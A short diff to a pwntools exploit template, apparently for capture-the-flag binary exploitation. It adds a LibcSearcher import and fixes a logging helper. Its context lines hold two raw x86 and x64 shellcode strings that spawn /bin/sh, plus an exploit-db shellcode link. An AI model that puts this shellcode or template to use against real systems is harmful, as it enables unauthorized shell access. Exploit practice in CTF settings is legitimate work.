@@ -2,6 +2,7 @@
 
 # %%
 from pwn import *
+from LibcSearcher import *
 
 {bindings}
 
@@ -33,7 +34,7 @@ rl = lambda: p.recvline()
 ru = lambda delims, drop=True: p.recvuntil(delims, drop)
 uu32 = lambda data: u32(data.ljust(4, b'\x00'))
 uu64 = lambda data: u64(data.ljust(8, b'\x00'))
-li = lambda str, data: log.success(str + b'========>' + hex(data))
+li = lambda str, data: log.success(str + '========>' + hex(data))
 
 # %%
 sh_x86_18 = b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
@@ -42,7 +43,6 @@ sh_x64_21 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\x
 # https://www.exploit-db.com/shellcodes
 
 # %%
-
 
 
 # %%
